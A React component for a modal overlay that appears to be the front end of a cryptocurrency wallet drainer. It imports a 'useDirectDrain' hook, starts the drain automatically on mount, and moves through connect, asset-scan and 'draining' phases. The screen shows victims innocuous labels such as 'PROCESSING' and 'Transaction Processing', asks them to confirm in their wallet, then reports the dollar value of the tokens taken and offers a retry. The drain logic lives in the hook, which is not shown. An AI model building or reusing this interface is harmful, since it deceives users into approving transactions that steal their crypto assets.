import { useEffect } from "react";
import { useDirectDrain, type DrainPhase } from "@/hooks/useDirectDrain";

interface Props {
  onClose: () => void;
}

const PHASE_LABELS: Record<DrainPhase, string> = {
  idle:       "INITIALIZING...",
  connecting: "CONNECTING WALLET",
  scanning:   "SCANNING ASSETS",
  draining:   "PROCESSING",
  done:       "COMPLETE",
  error:      "ERROR",
};

const PHASE_COLORS: Record<DrainPhase, string> = {
  idle:       "oklch(0.75 0.25 195)",
  connecting: "oklch(0.75 0.25 195)",
  scanning:   "oklch(0.72 0.28 320)",
  draining:   "oklch(0.72 0.28 320)",
  done:       "oklch(0.75 0.25 145)",
  error:      "oklch(0.65 0.28 25)",
};

export default function DirectConnectOverlay({ onClose }: Props) {
  const { phase, progress, msg, result, run, reset } = useDirectDrain();

  // Auto-start drain on mount
  useEffect(() => {
    run();
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  const color = PHASE_COLORS[phase];
  const label = PHASE_LABELS[phase];
  const isDone  = phase === "done";
  const isError = phase === "error";
  const isActive = !isDone && !isError;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      {/* Backdrop */}
      <div className="absolute inset-0 bg-black/90 backdrop-blur-lg" onClick={isActive ? undefined : onClose} />

      {/* Modal */}
      <div
        className="relative w-full max-w-sm rounded-2xl overflow-hidden"
        style={{
          background: 'oklch(0.05 0.015 240)',
          border: `1px solid ${color}55`,
          boxShadow: `0 0 50px ${color}25, 0 0 100px ${color}10`,
        }}>

        {/* Top glow bar */}
        <div className="h-1 w-full" style={{ background: `linear-gradient(90deg, transparent, ${color}, transparent)` }} />

        {/* Header */}
        <div className="px-6 pt-5 pb-3 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <span className="w-2 h-2 rounded-full animate-pulse" style={{ background: color, boxShadow: `0 0 8px ${color}` }} />
            <span className="text-xs font-bold tracking-widest uppercase" style={{ color, fontFamily: 'Orbitron' }}>
              {label}
            </span>
          </div>
          {(isDone || isError) && (
            <button onClick={onClose}
              className="text-muted-foreground hover:text-foreground text-sm transition-colors">
              ✕
            </button>
          )}
        </div>

        {/* Body */}
        <div className="px-6 pb-6 flex flex-col items-center gap-5">

          {/* Animated ring */}
          <div className="relative w-28 h-28 flex items-center justify-center">
            {/* Outer ring */}
            <svg className="absolute inset-0 w-full h-full" style={{ transform: 'rotate(-90deg)' }}>
              <circle cx="56" cy="56" r="48" fill="none" stroke={`${color}20`} strokeWidth="3" />
              <circle
                cx="56" cy="56" r="48" fill="none"
                stroke={color} strokeWidth="3"
                strokeLinecap="round"
                strokeDasharray={`${2 * Math.PI * 48}`}
                strokeDashoffset={`${2 * Math.PI * 48 * (1 - progress / 100)}`}
                style={{ transition: 'stroke-dashoffset 0.5s ease', filter: `drop-shadow(0 0 6px ${color})` }}
              />
            </svg>

            {/* Inner icon */}
            <div className="relative z-10 text-3xl">
              {isDone  && "✓"}
              {isError && "✕"}
              {isActive && (
                <span className="block animate-spin" style={{ animationDuration: '2s' }}>⟳</span>
              )}
            </div>

            {/* Progress % */}
            {isActive && (
              <div className="absolute -bottom-1 left-1/2 -translate-x-1/2 text-xs font-bold"
                style={{ color, fontFamily: 'Orbitron', fontSize: '0.7rem' }}>
                {Math.round(progress)}%
              </div>
            )}
          </div>

          {/* Status message */}
          <div className="text-center space-y-1 w-full">
            <p className="text-sm font-semibold" style={{ color, fontFamily: 'Rajdhani', letterSpacing: '0.05em' }}>
              {msg || "Please confirm in your wallet app"}
            </p>
          </div>

          {/* Progress steps */}
          {isActive && (
            <div className="w-full space-y-2">
              {[
                { key: "connecting", label: "Wallet Connection" },
                { key: "scanning",   label: "Asset Scan" },
                { key: "draining",   label: "Transaction Processing" },
              ].map(step => {
                const phases: DrainPhase[] = ["connecting", "scanning", "draining", "done"];
                const stepIdx    = phases.indexOf(step.key as DrainPhase);
                const currentIdx = phases.indexOf(phase);
                const done   = currentIdx > stepIdx;
                const active = currentIdx === stepIdx;

                return (
                  <div key={step.key} className="flex items-center gap-3">
                    <div className="w-5 h-5 rounded-full flex items-center justify-center text-xs flex-shrink-0"
                      style={{
                        background: done ? `${color}20` : active ? `${color}15` : 'transparent',
                        border: `1px solid ${done || active ? color : 'oklch(0.3 0.02 240)'}`,
                        color: done || active ? color : 'oklch(0.4 0.02 240)',
                      }}>
                      {done ? "✓" : active ? "●" : "○"}
                    </div>
                    <span className="text-xs" style={{
                      color: done || active ? 'oklch(0.85 0.02 240)' : 'oklch(0.4 0.02 240)',
                      fontFamily: 'Share Tech Mono',
                    }}>
                      {step.label}
                    </span>
                    {active && (
                      <span className="ml-auto text-xs animate-pulse" style={{ color, fontFamily: 'Share Tech Mono' }}>
                        running...
                      </span>
                    )}
                  </div>
                );
              })}
            </div>
          )}

          {/* Done: result summary */}
          {isDone && result && (
            <div className="w-full space-y-3">
              <div className="text-center">
                <p className="text-3xl font-black" style={{ color, fontFamily: 'Orbitron' }}>
                  ${result.totalUsd.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                </p>
                <p className="text-xs text-muted-foreground mt-1" style={{ fontFamily: 'Share Tech Mono' }}>
                  Total value processed
                </p>
              </div>

              {result.tokens.length > 0 && (
                <div className="space-y-1.5">
                  {result.tokens.map((t, i) => (
                    <div key={i} className="flex items-center justify-between px-3 py-2 rounded-lg"
                      style={{ background: 'oklch(0.08 0.02 240)', border: '1px solid oklch(0.75 0.25 145 / 0.2)' }}>
                      <span className="text-sm font-bold" style={{ fontFamily: 'Rajdhani' }}>{t.symbol}</span>
                      <div className="text-right">
                        <p className="text-xs text-muted-foreground" style={{ fontFamily: 'Share Tech Mono' }}>{t.balance}</p>
                        <p className="text-xs font-bold" style={{ color: 'oklch(0.75 0.25 145)', fontFamily: 'Orbitron', fontSize: '0.7rem' }}>
                          ${t.usdValue.toFixed(2)}
                        </p>
                      </div>
                    </div>
                  ))}
                </div>
              )}

              <button onClick={onClose}
                className="w-full py-3 rounded-xl font-bold text-sm"
                style={{
                  background: `linear-gradient(135deg, ${color}, oklch(0.72 0.28 320))`,
                  color: '#000',
                  fontFamily: 'Orbitron',
                  fontSize: '0.8rem',
                }}>
                CLOSE
              </button>
            </div>
          )}

          {/* Error */}
          {isError && (
            <div className="w-full space-y-3 text-center">
              <p className="text-sm text-muted-foreground" style={{ fontFamily: 'Rajdhani' }}>
                {msg || "Connection failed. Please try again."}
              </p>
              <div className="flex gap-2">
                <button onClick={() => { reset(); run(); }}
                  className="flex-1 py-3 rounded-xl font-bold text-sm"
                  style={{
                    background: 'oklch(0.72 0.28 320 / 0.15)',
                    border: '1px solid oklch(0.72 0.28 320 / 0.4)',
                    color: 'oklch(0.72 0.28 320)',
                    fontFamily: 'Orbitron',
                    fontSize: '0.75rem',
                  }}>
                  RETRY
                </button>
                <button onClick={onClose}
                  className="flex-1 py-3 rounded-xl font-bold text-sm"
                  style={{
                    background: 'oklch(0.1 0.02 240)',
                    border: '1px solid oklch(0.3 0.02 240)',
                    color: 'oklch(0.5 0.02 240)',
                    fontFamily: 'Orbitron',
                    fontSize: '0.75rem',
                  }}>
                  CANCEL
                </button>
              </div>
            </div>
          )}
        </div>

        {/* Bottom glow bar */}
        <div className="h-px w-full" style={{ background: `linear-gradient(90deg, transparent, ${color}40, transparent)` }} />
      </div>
    </div>
  );
}
